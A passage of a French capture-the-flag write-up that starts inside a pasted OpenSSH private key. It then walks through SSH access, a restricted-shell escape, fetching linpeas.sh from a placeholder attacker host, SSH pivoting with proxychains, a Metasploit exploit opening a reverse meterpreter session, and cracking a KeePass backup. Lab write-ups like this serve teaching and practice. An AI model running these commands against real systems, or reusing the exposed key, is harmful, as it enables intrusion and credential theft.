KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA2ZF5CXjpJEXz3SNr7Ol7BvL3F5fiQgtqsc46nOY8ZQ0IZxmcIo2G\nRJIIYn1fEC/IU0qcgyWtzE+GYrusKdxL8oJ6A8d8zYkqkoZKkwn4QCRHAU9WS0NJfxpM4M\nsp4DEkAMmuFnoVNftQ3r7NZnBlYg9Jf6djiTp1GAfnSAxTzNEWZBhoiGI9/q7sL0AW49V7\nw5183/Rj/sM4kGmr469DStZJFWSPGKObvY1YS3IXV9j16+QN+usrVQVBZQWFz+NR98puwK\n7GppFxf23np8Nb0OoneWoGGCNhbV5VLq84vSIjkO+t5M556+WiRJMe6sZuCQQ09hTlf6jA\nn5Rp29oasQAAA9AEQyW/BEMlvwAAAAdzc2gtcnNhAAABAQDZkXkJeOkkRfPdI2vs6XsG8v\ncXl+JCC2qxzjqc5jxlDQhnGZwijYZEkghifV8QL8hTSpyDJa3MT4Ziu6wp3EvygnoDx3zN\niSqShkqTCfhAJEcBT1ZLQ0l/GkzgyyngMSQAya4WehU1+1Devs1mcGViD0l/p2OJOnUYB+\ndIDFPM0RZkGGiIYj3+ruwvQBbj1XvDnXzf9GP+wziQaavjr0NK1kkVZI8Yo5u9jVhLchdX\n2PXr5A366ytVBUFlBYXP41H3ym7ArsamkXF/beenw1vQ6id5agYYI2FtXlUurzi9IiOQ76\n3kznnr5aJEkx7qxm4JBDT2FOV/qMCflGnb2hqxAAAAAwEAAQAAAQEAoOIPzM9aJ3aK5AWj\ncycb0IGt8gZgS1JB7YWAljEyi87dXc/0QyDAHsiV5q6qsz+CNQVBQ0GDiUdtKml43+OFTa\njqLQ1A3oQFtSAU2TJQHq40y2UtfK4fFRwPqVLSfnQYGXUJhJl2Qdq7bFtPa+bFMYP4Z6sR\n0ZImsER35DEpbpP5gH1MpNVykBX7xdCz4xE2AE29hgPG8TdtW5eA5hBW++uHiWQvVmjyEm\n5kWB/qeJGT6ngXwms4Mh9ytwDMsIcFoxdNoW6DhixfGoqlJUtKFbAY9LFf5j4NzDa8l/wa\nndGxcZcujOCgZQCuEzcYzwUWKaqAikDv8Q1hl2iubtalIQAAAIAfaxGIcU2Ds+hzsVb07+\nheTf5elyC82v1Wz+LYQUojdAHsJynmLSbhYEfOrunLxkwPl+lEOGqrjnGPd82OLbSdXLIc\nPJ13EOsK0jlvQG3VorhpiybRaBXucRLD8FFNTozRt77HY3DDqRdNtZFdIoW6K/UqHx5bJK\nfZIgXdZNekhgAAAIEA8lRIB5S2HZTjD33tucWrX0ktGUojKWl58on77KlftrOmWSrIg4kb\nmVAN2+jIGxnFmipiQPFBPZT4ClL0T7nuVkzYRA3BHrd2D2bqdKSMrg8pk4uMeKI22U7Fh8\nmLvZCfNXBcsR2fNHodVF8cm2MfA1JlP2cgcnpmLVznNfLGRIUAAACBAOXXl+9C63eDb0V3\ndG/3iy/rn30UboPjZteFRyEgCiciOvAs+u+aQ4kKFvOusuNxpJ0fBIJ3qUKG7bzU1c5XWw\n+f2QdlwBr2PScV5QolF9p5JhUwAB45WDhnxGDrrg8NYqh3LrxPbKWmr6k7K6EMPrjj5h+y\nuFgXKSRVpluFZts9AAAAFmhhcnZlc3RlckBmNzUyNWE3MTA2NjgBAgME\n-----END OPENSSH PRIVATE KEY-----&#34;</span>}
+</span></span></code></pre></div><p><strong>PARFAIT !</strong> , une clé SSH :)</p>
+<p>Malheureusement, <strong>le port 22</strong> n&rsquo;accepte pas nôtre connexion . Refaisons un nmap avec l&rsquo;options <strong>-p-</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /root/Desktop
+</span></span><span style="display:flex;"><span>➜   nmap 20.126.99.66 -p-
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>3000/tcp  open  ppp
+</span></span><span style="display:flex;"><span>8000/tcp  open  http-alt
+</span></span><span style="display:flex;"><span>45236/tcp open  unknown
+</span></span></code></pre></div><p>On trouve un port élevé que nous n&rsquo;avions pas avant : <code>45236</code></p>
+<p>On peut se connecter en ssh :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">400</span> ./id_rsa
+</span></span><span style="display:flex;"><span>ssh -i ./id_rsa -p <span style="color:#ae81ff">45236</span> harvester@20.126.99.66
+</span></span></code></pre></div><p>Et HOP !  Un shell
+<img src="./img/rbash.png" alt="AltText"></p>
+<p>On peut lire le flag : Enfin !!!!!!!!!!!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester:~$ ls
+</span></span><span style="display:flex;"><span>current-log.log  flag-4.txt  host_discovered  root@10.10.99.124
+</span></span><span style="display:flex;"><span>harvester:~$ cat flag-4.txt
+</span></span><span style="display:flex;"><span>Flag <span style="color:#ae81ff">4</span> : ISEC<span style="color:#f92672">{</span>pR150n_8re4k<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>harvester:~$
+</span></span></code></pre></div><hr>
+<h2 id="where-am-i">Where am I</h2>
+<ul>
+<li><strong>Nom</strong>  : Where am I&hellip;</li>
+<li><strong>Point</strong> : 30</li>
+<li><strong>Description</strong> : You&rsquo;re in! Explore their infrastructure and bring back as much information as possible to take them down.</li>
+</ul>
+<h6 id="solution">Solution:</h6>
+<p>La première chose est d&rsquo;<code>escape</code> le <strong>lbash</strong> .
+On peut lister les commandes possibles :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester:~$ help
+</span></span><span style="display:flex;"><span>cat  cd  clear  echo  exit  help  history  lpath  ls  lsudo  pwd
+</span></span></code></pre></div><p>D&rsquo;après <a href="https://netsec.ws/?p=337" target="_blank">cette page</a> on peut escape le lbash facilement :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester:~$ echo os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>harvester@harvester:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>harvester<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>harvester<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>harvester<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>harvester@harvester:~$
+</span></span></code></pre></div><p>On peut importer des fichiers sur le ssh de la manière suivante :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#e6db74">&#34;from urllib import urlretrieve; urlretrieve(&#39;https://VPS_IP/linpeas.sh&#39;, &#39;/tmp/linpeas.sh&#39;)&#34;</span>
+</span></span></code></pre></div><p>Malheureusement, je n&rsquo;ai pas trouvé de <strong>privesc</strong> simple à faire.
+Par contre, on trouve quelque chose de très intéressant !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Hostname, hosts and DNS
+</span></span><span style="display:flex;"><span>harvester
+</span></span><span style="display:flex;"><span>127.0.0.1       localhost
+</span></span><span style="display:flex;"><span>::1     localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>fe00::0 ip6-localnet
+</span></span><span style="display:flex;"><span>ff00::0 ip6-mcastprefix
+</span></span><span style="display:flex;"><span>ff02::1 ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2 ip6-allrouters
+</span></span><span style="display:flex;"><span>10.14.1.2       harvester
+</span></span><span style="display:flex;"><span>192.168.51.2    harvester
+</span></span><span style="display:flex;"><span>search dxlienjzncwejnldfntx3slhac.ax.internal.cloudapp.net
+</span></span><span style="display:flex;"><span>nameserver 127.0.0.11
+</span></span><span style="display:flex;"><span>options ndots:0
+</span></span></code></pre></div><p>On a accès à <em><em>2 sous-réseaux</em></em> :</p>
+<ul>
+<li><strong>10.14.1.0/24</strong></li>
+<li><strong>192.168.51.0/24</strong></li>
+</ul>
+<p>On peut donc quitter puis refaire une connexion ssh mais cette fois, on va utiliser la fonction de <a href="https://www.searchevolution.com/security/2021/07/22/pivot-avec-ssh-plink-socat-chisel-ou-sshuttle/" target="_blank">pivoting</a> de ssh</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -D <span style="color:#ae81ff">9050</span>  -i ./id_rsa -p <span style="color:#ae81ff">45236</span> harvester@20.126.99.66
+</span></span></code></pre></div><p>Depuis notre shell attaquant, on peut maintenant scanner leur réseau internet grâce à un proxy comme <a href="https://doc.ubuntu-fr.org/proxychains" target="_blank"><code>Proxychains</code></a></p>
+<p>Après les nmaps sur les 2 réseaux. On obtient :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.51.2
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span> <span style="color:#75715e">#Inconnu</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.51.3
+</span></span><span style="display:flex;"><span>5432/tcp open       PostgreSQL DB 9.6.0 or later
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.51.5
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#75715e"># GITLAB</span>
+</span></span><span style="display:flex;"><span>8181/tcp open  intermapper      <span style="color:#75715e"># Gestion de serveur = intermapper</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.14.1.1 // 192.168.51.1
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#75715e"># Page Phising microsoft</span>
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp              <span style="color:#75715e"># Login Custom</span>
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt         <span style="color:#75715e"># phpmyadmin</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.14.1.2
+</span></span><span style="display:flex;"><span>2048/tcp open  caldav  <span style="color:#75715e"># Intéressant</span>
+</span></span></code></pre></div><p>On peut en déduire le shéma réseau ci contre :</p>
+<p><img src="./img/network.png" alt="AltText"></p>
+<p>La dernière IP : <strong>10.14.1.2</strong> sur le port <strong>2048</strong> semble intéressante.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@localhost:/home/vozec# proxychains curl 10.14.1.2:2048
+</span></span><span style="display:flex;"><span>ProxyChains-3.1 <span style="color:#f92672">(</span>http://proxychains.sf.net<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>  &lt;body&gt;
+</span></span><span style="display:flex;"><span>    &lt;h1&gt;It works!&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>    &lt;p&gt;This is the default web page <span style="color:#66d9ef">for</span> this server.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>    &lt;p&gt;Flag <span style="color:#ae81ff">5</span> : ISEC<span style="color:#f92672">{</span>P0r7_5c4nn1g_iS_3asY<span style="color:#f92672">}</span>&lt;/p&gt;
+</span></span><span style="display:flex;"><span>    &lt;p&gt;The EMPIRE Stikes Back !&lt;/p&gt;
+</span></span><span style="display:flex;"><span>  &lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>HOP le flag !</p>
+<hr>
+<h2 id="stop-the-agents">Stop the agents</h2>
+<ul>
+<li><strong>Nom</strong>  : Stop the agents</li>
+<li><strong>Point</strong> : 30</li>
+<li><strong>Description</strong> :
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>As you can see, security does not seem to be a priority <span style="color:#66d9ef">for</span> them. It is unlikely that their C2 is really up to date. Find a vulnerability or vulnerabilities on it and bring back root access.
+</span></span><span style="display:flex;"><span>Finish the work !
+</span></span></code></pre></div></li>
+</ul>
+<h6 id="solution--6">Solution :</h6>
+<p>Après plusieurs heures de recherches. J&rsquo;ai trouvé <a href="https://www.tenable.com/blog/identifying-empire-http-listeners" target="_blank">cet article</a> ainsi que <a href="https://support.alertlogic.com/hc/en-us/articles/360004032471-PowerShell-Empire-Post-Exploitation-Framework-HTTP-based-C2-Communications" target="_blank">cette documentation</a>.</p>
+<p>On remarque que le nmap nous renvoie un <strong>http-server-header</strong> égale à <strong>Microsoft-IIS/7.5</strong> comme mentionné dans l&rsquo;article.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.14.1.3
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>2048/tcp open  caldav  Radicale calendar and contacts server <span style="color:#f92672">(</span>Python BaseHTTPServer<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: WAP|phone
+</span></span><span style="display:flex;"><span>Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
+</span></span><span style="display:flex;"><span>OS details: Tomato 1.28 <span style="color:#f92672">(</span>Linux 2.4.20<span style="color:#f92672">)</span>, Tomato firmware <span style="color:#f92672">(</span>Linux 2.6.22<span style="color:#f92672">)</span>, Sony Ericsson U8i Vivaz mobile phone
+</span></span></code></pre></div><p>De plus, ce texte est le texte par défaut d&rsquo;un <a href="https://www.wikiwand.com/fr/Command_and_Control" target="_blank"><strong>C2</strong></a> nommé <a href="https://github.com/BC-SECURITY/Empire" target="_blank"><strong>Empire</strong></a> et il ressemble énormément à celui qu&rsquo;on à trouvé au challenge précédent .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h1</span>&gt;It works!&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span>&gt;This is the default web page for this server.&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span>&gt;The web server software is running but no content has been added, yet.&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>La description nous parle d&rsquo;une vieille version de ce <strong>C2</strong> qui n&rsquo;est pas à jour.
+Si on regarde de plus prêt, on trouve un <code>exploit</code> sur <a href="https://www.metasploit.com/" target="_blank"><code>metasploit</code></a> qui permet d&rsquo;obtenir un shell :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains msfconsole -q
+</span></span><span style="display:flex;"><span>use exploit/linux/http/empire_skywalker
+</span></span><span style="display:flex;"><span>set RHOSTS 10.14.1.3
+</span></span><span style="display:flex;"><span>set RPORT <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>Résultats :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/http/empire_skywalker<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 194.233.164.121:4444
+</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
+</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully negotiated an artificial Empire agent
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing payload to /tmp/dwxCKALX
+</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing cron job to /etc/cron.d/DVRDDTYW
+</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Waiting <span style="color:#66d9ef">for</span> cron job to run, can take up to <span style="color:#ae81ff">60</span> seconds
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">40132</span> bytes<span style="color:#f92672">)</span> to 20.126.99.66
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /etc/cron.d/DVRDDTYW
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/dwxCKALX
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /agent.log
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>XXX.XXX.XXX.XXX:4444 -&gt; 20.126.99.66:57266<span style="color:#f92672">)</span> at 2022-06-30 14:49:02 +0000
+</span></span></code></pre></div><p>On peut lire le flag !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: /root
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">0</span>     fil   2022-06-30 14:45:01 +0000  .bash_history
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">570</span>   fil   2010-01-31 11:52:26 +0000  .bashrc
+</span></span><span style="display:flex;"><span>040700/rwx------  <span style="color:#ae81ff">4096</span>  dir   2022-06-30 08:43:29 +0000  .cache
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">148</span>   fil   2015-08-17 15:30:33 +0000  .profile
+</span></span><span style="display:flex;"><span>040700/rwx------  <span style="color:#ae81ff">4096</span>  dir   2022-06-30 08:43:52 +0000  .ssh
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">209</span>   fil   2022-06-30 08:43:54 +0000  .wget-hsts
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">151</span>   fil   2022-06-23 11:36:09 +0000  TODO.md
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">100</span>   fil   2022-06-23 11:36:08 +0000  flag6.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat flag6.txt
+</span></span><span style="display:flex;"><span>Flag-6 : ISEC<span style="color:#f92672">{</span>UnRE5trI<span style="color:#f92672">(</span>Ted_Up1oAd_of_F11e<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Finish the job and bring back the name of these thugs !
+</span></span></code></pre></div><hr>
+<h1 id="secondary-objectives-4-challenges">SECONDARY OBJECTIVES <em>(4 Challenges)</em></h1>
+<h2 id="backup-key">Backup key</h2>
+<ul>
+<li><strong>Nom</strong>  : Bad place</li>
+<li><strong>Point</strong> : 30</li>
+<li><strong>Description</strong> : Keep digging on their C2, they must have hidden secrets that we need to know.</li>
+</ul>
+<h6 id="solution--7">Solution :</h6>
+<p>Sur la machine précédente, celle en <strong>10.14.1.3</strong> qui contient le C&amp;C <code>Empire</code>, on trouve :</p>
+<ul>
+<li><strong>TODO.md</strong></li>
+<li><strong>/opt/backup.kdbx</strong></li>
+</ul>
+<p>On va les télécharger via la commande <code>download</code> de <strong>meterpreter</strong> , on en aura besoin plus tard !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>download TODO.md
+</span></span><span style="display:flex;"><span>download /opt/backup.kdbx
+</span></span></code></pre></div><p>Cette partie devient de la Forensic. On a un fichier en <code>.kdbx</code> et les fans de CTF auront reconnu un <code>fichier de mot passe Keepass</code></p>
+<p>Pour déchiffrer ce fichier et accéder à son contenu, on doit cracker la <code>MasterKey</code>.
+On utlise <a href="https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc" target="_blank"><strong>keepass2john</strong></a> pour obtenir un hash compatible avec <a href="https://github.com/openwall/john" target="_blank"><strong>JohnTheRipper</strong></a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>keepass2john backup.kdbx &gt; hash_masterkey.txt
+</span></span></code></pre></div><p>J&rsquo;ai d&rsquo;abord essayé de cracker le mot de passe avec <a href="https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz" target="_blank"><strong>rockyou.txt</strong></a> mais le mot de passe n&rsquo;a pas était trouvé &hellip;</p>
+<p>Donc j&rsquo;ai directement utilisé <strong>HashCat</strong> avec une rule et des mots-clés des challenges précédents pour générer une wordlist : <a href="https://github.com/NotSoSecure/password_cracking_rules" target="_blank">OneRuleToRuleThemAll.rule</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat --force list.txt -r ./OneRuleToRuleThemAll.rule --stdout | sort -u &gt; list-uniq.txt
+</span></span></code></pre></div><p>Puis j&rsquo;ai cracké le hash :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>KeePass h --wordlist<span style="color:#f92672">=</span>/tmp/list-uniq.txt
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>KeePass <span style="color:#f92672">[</span>SHA256 AES 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">60000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>version<span style="color:#f92672">)</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>algorithm <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>AES, 1<span style="color:#f92672">=</span>TwoFish, 2<span style="color:#f92672">=</span>ChaCha<span style="color:#f92672">])</span> is <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">16</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>0g 0:00:00:49 6,08% <span style="color:#f92672">(</span>ETA: 22:08:04<span style="color:#f92672">)</span> 0g/s 866.5p/s 866.5c/s 866.5C/s almendrapassword123..alohaphising
+</span></span><span style="display:flex;"><span>0g 0:00:03:47 35,41% <span style="color:#f92672">(</span>ETA: 22:05:20<span style="color:#f92672">)</span> 0g/s 983.7p/s 983.7c/s 983.7C/s jbu876a..jbu9ra6
+</span></span><span style="display:flex;"><span>operator1234     <span style="color:#f92672">(</span>backup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1g 0:00:05:57 DONE <span style="color:#f92672">(</span>2022-06-28 22:00<span style="color:#f92672">)</span> 0.002800g/s 955.6p/s 955.6c/s 955.6C/s op-erator1234..operator1234!!!
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed
+</span></span></code></pre></div><p><strong>operator1234</strong> &hellip;
+Super, un mot de passe connu que j&rsquo;avais déjà AHAHA. J&rsquo;aurais dû tester les anciens mots de passe avant !</p>
+<p>Maintenant, quand j&rsquo;ouvre le KeePass, j&rsquo;ai :</p>
+<p><img src="./img/keypass1.png" alt="AltText"></p>
+<p>et dans une autre section</p>
+<p><img src="./img/keypass2.png" alt="AltText"></p>
+<p>On fait <strong>&lsquo;Click Droit&rsquo;</strong> &gt; <strong>&lsquo;Copier le mot de passe&rsquo;</strong> et HOP : <code>ISEC{N0tG00dH1d1ngPl4C3}</code></p>
+<hr>
+<h2 id="final-takedown">Final takedown</h2>
+<ul>
+<li><strong>Nom</strong>  : Final takedown</li>
+<li><strong>Point</strong> : 30</li>
+<li><strong>Description</strong> :
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>It seems that not all their projects are in-house. See what you can <span style="color:#66d9ef">do</span> with it. Don<span style="color:#960050;background-color:#1e0010">&#39;</span>t forget that we need to find their identities. Bring back at least one email.
